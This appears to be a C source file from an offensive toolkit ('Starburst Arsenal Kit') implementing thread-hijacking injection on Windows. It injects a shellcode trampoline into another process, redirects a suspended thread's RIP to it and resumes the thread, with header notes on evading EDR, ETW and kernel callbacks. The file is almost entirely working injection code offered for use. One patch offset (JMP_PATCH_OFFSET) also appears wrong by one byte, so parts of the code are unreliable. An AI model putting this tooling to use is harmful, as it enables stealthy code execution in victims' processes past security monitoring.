/*
 * inject_threadhijack.c - Thread Hijacking Injection
 *
 * Starburst Arsenal Kit - Injection Techniques
 * =============================================
 *
 * TECHNIQUE: Thread Context Hijacking
 *
 * This technique hijacks an existing thread in the target process by
 * suspending it, saving its context, modifying the instruction pointer
 * (RIP) to point to shellcode, and resuming execution. No new thread
 * is created, which avoids the PsSetCreateThreadNotifyRoutineEx
 * kernel callback entirely.
 *
 * The shellcode is wrapped in a context-restoring trampoline that
 * saves the original thread state, executes the payload, then restores
 * the original context so the thread can continue normal execution.
 *
 * FLOW:
 *   1. OpenProcess - get handle to target
 *   2. VirtualAllocEx (RW) - allocate memory for shellcode + trampoline
 *   3. WriteProcessMemory - write trampoline + shellcode
 *   4. VirtualProtectEx (RX) - flip to executable
 *   5. Find and open a thread in the target process
 *   6. SuspendThread - pause the target thread
 *   7. GetThreadContext - save original RIP and registers
 *   8. SetThreadContext - set RIP to shellcode trampoline
 *   9. ResumeThread - thread executes shellcode, then resumes
 *
 * OPSEC RATING: MEDIUM-HIGH
 *
 *   No new thread is created, which is a significant advantage.
 *   Thread creation is one of the primary detection vectors for
 *   injection, and this technique bypasses it entirely. However,
 *   the SuspendThread + GetThreadContext + SetThreadContext pattern
 *   is itself monitored by sophisticated EDRs.
 *
 * DETECTION SURFACE:
 *   - ETW: Microsoft-Windows-Threat-Intelligence
 *       * EtwTiVirtualAllocEx (remote allocation)
 *       * EtwTiWriteVirtualMemory (cross-process write)
 *       * EtwTiGetSetContextThread (context manipulation)
 *   - Kernel callbacks:
 *       * ObRegisterCallbacks (thread handle with SUSPEND/CONTEXT rights)
 *   - User-mode hooks:
 *       * OpenProcess - cross-process handle
 *       * OpenThread - thread handle acquisition
 *       * SuspendThread - thread suspension
 *       * GetThreadContext / SetThreadContext - context manipulation
 *       * VirtualAllocEx - remote allocation
 *       * WriteProcessMemory - cross-process write
 *   - Behavioral:
 *       * Thread suspension followed by context modification
 *       * RIP changed to point to private/unbacked memory
 *       * Unusual thread handle access patterns
 *
 * MONITORED API CALLS:
 *   OpenProcess, OpenThread, SuspendThread, GetThreadContext,
 *   SetThreadContext, ResumeThread, VirtualAllocEx,
 *   WriteProcessMemory, VirtualProtectEx
 *
 * PROS:
 *   - No new thread created (bypasses thread creation callbacks)
 *   - No CreateRemoteThread / NtCreateThreadEx
 *   - Hijacked thread resumes normal execution after shellcode
 *   - Thread ID does not change (harder to correlate)
 *
 * CONS:
 *   - Complex implementation (context save/restore)
 *   - SuspendThread + SetThreadContext is monitored
 *   - Thread may be in a critical section when suspended (deadlock risk)
 *   - Still uses VirtualAllocEx + WriteProcessMemory
 *   - Shellcode still runs from private (unbacked) memory
 *   - If shellcode crashes, the hijacked thread is lost
 *
 * THREAD SELECTION:
 *   Choose a thread that:
 *   - Is not the main thread (less likely to cause hangs)
 *   - Is in a wait state (less likely to be in a critical section)
 *   - Belongs to a worker pool (expendable if things go wrong)
 *   The implementation here uses the first non-main thread found.
 *
 * ADAPTING FOR STARBURST PIC (Stardust framework):
 *   - Replace Win32 thread APIs with Nt equivalents:
 *     NtSuspendThread, NtGetContextThread, NtSetContextThread,
 *     NtResumeThread (all typedef'd in injection.h)
 *   - The trampoline assembly is x64-specific; adjust for x86
 *   - Consider using NtAllocateVirtualMemory + NtWriteVirtualMemory
 *   - For best OPSEC, combine with section-based allocation
 *     (inject_section.c) to avoid VirtualAllocEx
 *
 * COMPILE:
 *   cl.exe /W4 /O2 inject_threadhijack.c /Fe:inject_threadhijack.exe
 */

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>
#include "../include/injection.h"

/*
 * x64 trampoline shellcode that:
 *   1. Saves all volatile registers
 *   2. Aligns stack to 16 bytes
 *   3. Calls the actual shellcode (immediately follows trampoline)
 *   4. Restores registers
 *   5. Jumps back to the original RIP
 *
 * The original RIP is stored at a known offset within the trampoline,
 * patched at runtime before writing to the remote process.
 *
 * Layout in memory:
 *   [trampoline] [shellcode] [original_rip (8 bytes)]
 */

/*
 * Trampoline assembly (x64):
 *
 *   ; Save volatile registers
 *   push rax
 *   push rcx
 *   push rdx
 *   push r8
 *   push r9
 *   push r10
 *   push r11
 *   pushfq                    ; save flags
 *   sub rsp, 0x28             ; shadow space + alignment
 *
 *   ; Call shellcode (relative call to code right after trampoline)
 *   lea rax, [rip + <offset>] ; address of shellcode
 *   call rax
 *
 *   ; Restore
 *   add rsp, 0x28
 *   popfq
 *   pop r11
 *   pop r10
 *   pop r9
 *   pop r8
 *   pop rdx
 *   pop rcx
 *   pop rax
 *
 *   ; Jump to original RIP
 *   jmp qword ptr [rip + <offset>]  ; original_rip location
 */

/* Pre-assembled trampoline bytes (x64) */
static const unsigned char TRAMPOLINE[] = {
    /* Save registers */
    0x50,                               /* push rax          */
    0x51,                               /* push rcx          */
    0x52,                               /* push rdx          */
    0x41, 0x50,                         /* push r8           */
    0x41, 0x51,                         /* push r9           */
    0x41, 0x52,                         /* push r10          */
    0x41, 0x53,                         /* push r11          */
    0x9C,                               /* pushfq            */
    0x48, 0x83, 0xEC, 0x28,             /* sub rsp, 0x28     */

    /* lea rax, [rip + offset_to_shellcode] */
    /* The offset is patched at runtime       */
    0x48, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00,  /* lea rax, [rip+0] ; +16..22, patch at 19 */

    /* call rax */
    0xFF, 0xD0,                         /* call rax          */

    /* Restore */
    0x48, 0x83, 0xC4, 0x28,             /* add rsp, 0x28     */
    0x9D,                               /* popfq             */
    0x41, 0x5B,                         /* pop r11           */
    0x41, 0x5A,                         /* pop r10           */
    0x41, 0x59,                         /* pop r9            */
    0x41, 0x58,                         /* pop r8            */
    0x5A,                               /* pop rdx           */
    0x59,                               /* pop rcx           */
    0x58,                               /* pop rax           */

    /* jmp qword ptr [rip + offset_to_original_rip] */
    /* The offset is patched at runtime                */
    0xFF, 0x25, 0x00, 0x00, 0x00, 0x00  /* jmp [rip+0] ; patch at 42 */
};

#define TRAMPOLINE_SIZE     sizeof(TRAMPOLINE)
#define LEA_PATCH_OFFSET    19   /* Offset of the LEA RIP-relative displacement */
#define JMP_PATCH_OFFSET    42   /* Offset of the JMP RIP-relative displacement */

/*
 * find_target_thread - Find a suitable thread to hijack in the target process.
 *
 * Prefers a non-main thread to reduce risk of deadlock.
 * Falls back to the first thread found if only one exists.
 *
 * Parameters:
 *   pid    - Target process ID
 *   mainTid - [out] Optional, receives the main thread ID
 *
 * Returns:
 *   Thread ID of the chosen thread, or 0 on failure.
 */
static DWORD find_target_thread(DWORD pid, DWORD *mainTid) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);

    DWORD firstTid  = 0;
    DWORD secondTid = 0;
    int   count     = 0;

    if (Thread32First(hSnapshot, &te32)) {
        do {
            if (te32.th32OwnerProcessID == pid) {
                if (count == 0) {
                    firstTid = te32.th32ThreadID;
                    if (mainTid) *mainTid = firstTid;
                } else if (count == 1) {
                    secondTid = te32.th32ThreadID;
                }
                count++;
            }
        } while (Thread32Next(hSnapshot, &te32));
    }

    CloseHandle(hSnapshot);

    /* Prefer a non-main thread */
    if (secondTid != 0) {
        fprintf(stderr, "[+] Found %d threads, selecting TID %lu (non-main)\n",
                count, (unsigned long)secondTid);
        return secondTid;
    }

    if (firstTid != 0) {
        fprintf(stderr, "[!] Only 1 thread found, using main TID %lu\n",
                (unsigned long)firstTid);
        return firstTid;
    }

    return 0;
}

/*
 * inject - Perform thread hijacking injection into a target process.
 *
 * Parameters:
 *   pid           - Target process ID
 *   shellcode     - Pointer to shellcode buffer
 *   shellcode_len - Size of shellcode in bytes
 *
 * Returns:
 *   TRUE on success, FALSE on failure.
 *
 * Notes:
 *   The shellcode should be position-independent and must return
 *   (via ret) for the trampoline to restore the original thread
 *   context. If the shellcode does not return, the original thread
 *   will not resume.
 */
BOOL inject(DWORD pid, LPVOID shellcode, SIZE_T shellcode_len) {
    HANDLE  hProcess     = NULL;
    HANDLE  hThread      = NULL;
    LPVOID  remoteBuffer = NULL;
    CONTEXT ctx;
    BOOL    threadSuspended = FALSE;
    BOOL    result          = FALSE;

    /*
     * Memory layout in the remote process:
     *   [trampoline (TRAMPOLINE_SIZE bytes)]
     *   [shellcode (shellcode_len bytes)]
     *   [original_rip (8 bytes)]
     */
    SIZE_T totalSize = TRAMPOLINE_SIZE + shellcode_len + sizeof(DWORD64);

    /* Build the combined payload locally */
    unsigned char *payload = (unsigned char *)malloc(totalSize);
    if (!payload) {
        fprintf(stderr, "[!] malloc failed\n");
        goto cleanup;
    }

    /* Copy trampoline template */
    memcpy(payload, TRAMPOLINE, TRAMPOLINE_SIZE);

    /* Copy shellcode after trampoline */
    memcpy(payload + TRAMPOLINE_SIZE, shellcode, shellcode_len);

    /* Zero the original_rip slot (will be patched after GetThreadContext) */
    memset(payload + TRAMPOLINE_SIZE + shellcode_len, 0, sizeof(DWORD64));

    /*
     * Patch the LEA offset: trampoline needs to know where shellcode is.
     * LEA is at offset LEA_PATCH_OFFSET, instruction ends at LEA_PATCH_OFFSET+4.
     * Shellcode is at TRAMPOLINE_SIZE.
     * RIP-relative offset = target - (instruction_end)
     *                     = TRAMPOLINE_SIZE - (LEA_PATCH_OFFSET + 4)
     */
    DWORD leaDisp = (DWORD)(TRAMPOLINE_SIZE - (LEA_PATCH_OFFSET + 4));
    memcpy(payload + LEA_PATCH_OFFSET, &leaDisp, sizeof(DWORD));

    /*
     * Patch the JMP offset: trampoline needs to find original_rip.
     * JMP is at offset JMP_PATCH_OFFSET, instruction ends at JMP_PATCH_OFFSET+4.
     * original_rip is at TRAMPOLINE_SIZE + shellcode_len.
     * RIP-relative offset = (TRAMPOLINE_SIZE + shellcode_len) - (JMP_PATCH_OFFSET + 4)
     */
    DWORD jmpDisp = (DWORD)((TRAMPOLINE_SIZE + shellcode_len) -
                             (JMP_PATCH_OFFSET + 4));
    memcpy(payload + JMP_PATCH_OFFSET, &jmpDisp, sizeof(DWORD));

    /* --------------------------------------------------------
     * Step 1: Open target process
     * -------------------------------------------------------- */
    hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        FALSE, pid
    );
    if (!hProcess) {
        fprintf(stderr, "[!] OpenProcess failed: %lu\n", GetLastError());
        goto cleanup;
    }
    fprintf(stderr, "[+] Opened process %lu\n", pid);

    /* --------------------------------------------------------
     * Step 2: Allocate memory in target process
     * -------------------------------------------------------- */
    remoteBuffer = VirtualAllocEx(
        hProcess, NULL, totalSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );
    if (!remoteBuffer) {
        fprintf(stderr, "[!] VirtualAllocEx failed: %lu\n", GetLastError());
        goto cleanup;
    }
    fprintf(stderr, "[+] Allocated %zu bytes at 0x%p\n",
            totalSize, remoteBuffer);

    /* --------------------------------------------------------
     * Step 3: Find a thread to hijack
     * -------------------------------------------------------- */
    DWORD mainTid = 0;
    DWORD targetTid = find_target_thread(pid, &mainTid);
    if (targetTid == 0) {
        fprintf(stderr, "[!] No suitable thread found in PID %lu\n", pid);
        goto cleanup;
    }

    /* --------------------------------------------------------
     * Step 4: Open and suspend the target thread
     *
     * THREAD_SUSPEND_RESUME - for SuspendThread/ResumeThread
     * THREAD_GET_CONTEXT    - for GetThreadContext
     * THREAD_SET_CONTEXT    - for SetThreadContext
     * -------------------------------------------------------- */
    hThread = OpenThread(
        THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
        FALSE, targetTid
    );
    if (!hThread) {
        fprintf(stderr, "[!] OpenThread(%lu) failed: %lu\n",
                targetTid, GetLastError());
        goto cleanup;
    }

    if (SuspendThread(hThread) == (DWORD)-1) {
        fprintf(stderr, "[!] SuspendThread failed: %lu\n", GetLastError());
        goto cleanup;
    }
    threadSuspended = TRUE;
    fprintf(stderr, "[+] Thread %lu suspended\n", targetTid);

    /* --------------------------------------------------------
     * Step 5: Get the thread's current context (save RIP)
     * -------------------------------------------------------- */
    ZeroMemory(&ctx, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(hThread, &ctx)) {
        fprintf(stderr, "[!] GetThreadContext failed: %lu\n", GetLastError());
        goto cleanup;
    }
    fprintf(stderr, "[+] Original RIP: 0x%016llX\n",
            (unsigned long long)ctx.Rip);

    /* --------------------------------------------------------
     * Step 6: Patch the original RIP into the payload
     *
     * The trampoline's final JMP instruction reads the original
     * RIP from the end of our payload buffer.
     * -------------------------------------------------------- */
    DWORD64 originalRip = ctx.Rip;
    memcpy(payload + TRAMPOLINE_SIZE + shellcode_len,
           &originalRip, sizeof(DWORD64));

    /* --------------------------------------------------------
     * Step 7: Write the payload to the remote process
     * -------------------------------------------------------- */
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(hProcess, remoteBuffer, payload,
                            totalSize, &bytesWritten)) {
        fprintf(stderr, "[!] WriteProcessMemory failed: %lu\n", GetLastError());
        goto cleanup;
    }
    fprintf(stderr, "[+] Wrote %zu bytes (trampoline + shellcode + rip)\n",
            bytesWritten);

    /* --------------------------------------------------------
     * Step 8: Flip memory to RX
     * -------------------------------------------------------- */
    DWORD oldProtect = 0;
    if (!VirtualProtectEx(hProcess, remoteBuffer, totalSize,
                          PAGE_EXECUTE_READ, &oldProtect)) {
        fprintf(stderr, "[!] VirtualProtectEx failed: %lu\n", GetLastError());
        goto cleanup;
    }

    /* --------------------------------------------------------
     * Step 9: Set RIP to the trampoline entry point
     *
     * When the thread resumes, it will execute our trampoline,
     * which saves registers, calls the shellcode, restores
     * registers, and jumps back to the original RIP.
     * -------------------------------------------------------- */
    ctx.Rip = (DWORD64)remoteBuffer;

    if (!SetThreadContext(hThread, &ctx)) {
        fprintf(stderr, "[!] SetThreadContext failed: %lu\n", GetLastError());
        goto cleanup;
    }
    fprintf(stderr, "[+] RIP set to trampoline at 0x%p\n", remoteBuffer);

    /* --------------------------------------------------------
     * Step 10: Resume the thread
     *
     * The thread will now execute:
     *   1. Trampoline (save registers)
     *   2. Shellcode
     *   3. Trampoline (restore registers)
     *   4. Jump to original RIP (resume normal execution)
     * -------------------------------------------------------- */
    if (ResumeThread(hThread) == (DWORD)-1) {
        fprintf(stderr, "[!] ResumeThread failed: %lu\n", GetLastError());
        goto cleanup;
    }
    threadSuspended = FALSE;
    fprintf(stderr, "[+] Thread %lu resumed - shellcode executing\n",
            targetTid);

    result = TRUE;

cleanup:
    /* If we suspended the thread but failed, resume it */
    if (threadSuspended && hThread) {
        fprintf(stderr, "[*] Restoring original context and resuming thread\n");
        ctx.Rip = originalRip;
        SetThreadContext(hThread, &ctx);
        ResumeThread(hThread);
    }

    if (payload)  free(payload);
    if (hThread)  CloseHandle(hThread);
    if (hProcess) CloseHandle(hProcess);

    return result;
}

#ifdef BUILD_STANDALONE
int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        return 1;
    }

    DWORD pid = (DWORD)atoi(argv[1]);

    /* Placeholder shellcode: NOP sled + breakpoint + RET
     * The RET is important - the trampoline calls the shellcode,
     * so it must return for the original thread to resume. */
    unsigned char shellcode[] = {
        0x90, 0x90, 0x90, 0x90,  /* NOP NOP NOP NOP */
        0xCC,                     /* INT3 (breakpoint) */
        0xC3                      /* RET */
    };

    printf("[*] Thread hijacking injection\n");
    printf("[*] Target PID: %lu\n", pid);
    printf("[*] Shellcode size: %zu bytes\n", sizeof(shellcode));

    if (inject(pid, shellcode, sizeof(shellcode))) {
        printf("[+] Injection succeeded\n");
        return 0;
    } else {
        printf("[-] Injection failed\n");
        return 1;
    }
}
#endif
